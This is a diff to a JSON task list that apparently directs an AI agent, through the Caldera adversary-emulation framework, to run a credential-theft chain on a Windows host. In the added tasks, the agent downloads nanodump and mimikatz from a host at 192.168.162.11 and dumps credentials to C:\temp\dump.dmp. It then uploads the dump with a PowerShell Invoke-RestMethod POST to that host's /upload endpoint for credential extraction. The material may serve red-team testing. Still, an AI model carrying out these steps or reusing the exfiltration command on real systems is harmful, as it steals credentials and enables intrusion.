@@ -70,7 +70,7 @@
         {
             "ID": "define_nanodump_facts_and_objective_task",
             "description": "Print literal the expected output",
-            "expected_output": "Print this answer: The payload we want to use in the next tasks is called nanodump. Documentation is at https://raw.githubusercontent.com/fortra/nanodump/main/README.md. The name of the payload is nanondump.x64.exe. The download link to the tool is http://192.168.162.11:8000/payloads/nanodump.x64.exe.  The working directory is C:\temp. You are running on Windows, so use backslashes for paths. The payload objective is to use nanodump to dump credentials to a file in the C:\temp directory, while forking the process."
+            "expected_output": "Print this answer: The payload we want to use in the next tasks is called nanodump. Documentation is at https://raw.githubusercontent.com/fortra/nanodump/main/README.md. The name of the payload is nanondump.x64.exe. The download link to the tool is http://192.168.162.11:8000/payloads/nanodump.x64.exe. You can upload files using a POST call to http://192.168.162.11:8000/upload. The working directory is C:\temp. You are running on Windows, so use backslashes for paths. The payload objective is to use nanodump to dump credentials to a file in the C:\temp directory, while forking the process & creating dumps with valid signatures. Write to C:\\temp\\dump.dmp"
         },
         {
             "ID": "lookup_tool_documentation_on_github_task",
@@ -97,9 +97,25 @@
             ]
         },
         {
+            "ID": "caldera_get_powershell_version_task",
+            "description": "Use PowerShell to get the version of powershell running.",
+            "expected_output": "The output of the command with a summarized analysis. Clearly indicate if the command was successfully executed or not",
+            "tools": [
+                "caldera_execute_command_on_agent_tool"
+            ]
+        },
+        {
+            "ID": "caldera_extract_dump_file_task",
+            "description": "Use PowerShell to upload the generated dump file to our server, where we will use it to extract credentials. Upload C:/temp/dump.dmp. Use 'cmd' to then run the PowerShell command using 'pwsh'. Example: cmd /c pwsh -Command Invoke-RestMethod -Uri, and take this into account: $uri = '<UPLOAD_URL>' $body = @{ 'filename'='<FILE_NAME>'; 'content_type'='text/plain'; 'file'=[IO.File]::ReadAllBytes('<FILE_PATH>') } Invoke-RestMethod -uri $uri -method POST -body $body",
+            "expected_output": "The output of the command with a summarized analysis. Clearly indicate if the command was successfully executed or not",
+            "tools": [
+                "caldera_execute_command_on_agent_tool"
+            ]
+        },
+        {
             "ID": "caldera_execute_payload_task",
             "description": "Use PowerShell to execute the payload. Use the right command line arugments to successfully reach the objective, based on the documentation you received in previous steps. You are ONLY successfull if you can verify that the output of the command was successfull.",
-            "expected_output": "The output of the command with a summarized analysis. Clearly indicate if the command was successfully executed or not",
+            "expected_output": "The output of the command with a summarized analysis. Clearly indicate if the command was successfully executed or not, and if applicable, the file path of any file that you created.",
             "tools": [
                 "caldera_execute_command_on_agent_tool"
             ]
@@ -130,6 +146,11 @@
         {
             "ID": "download_mimikatz_task",
             "description": "Use powershell to download the latest release of mimikatz to C:\temp. Look for the right URL to download by seaching on the relases page of the github repository. Then send a command to Caldera to download the latest release to the C:/temp folder",
+            "expected_output": "The output of the command with a summarized analysis. Clearly indicate if the command was successfully executed or not."
+        },
+        {
+            "ID": "caldera_open_relevant_folder",
+            "description": "Run a command to open the explorer window visually on the desktop to the relevant folder where we are performing actions. Make sure a Window is visually opened on the desktop, and not just a command that is executed in the background.",
             "expected_output": "The output of the command with a summarized analysis. Clearly indicate if the command was successfully executed or not."
         }
     ]
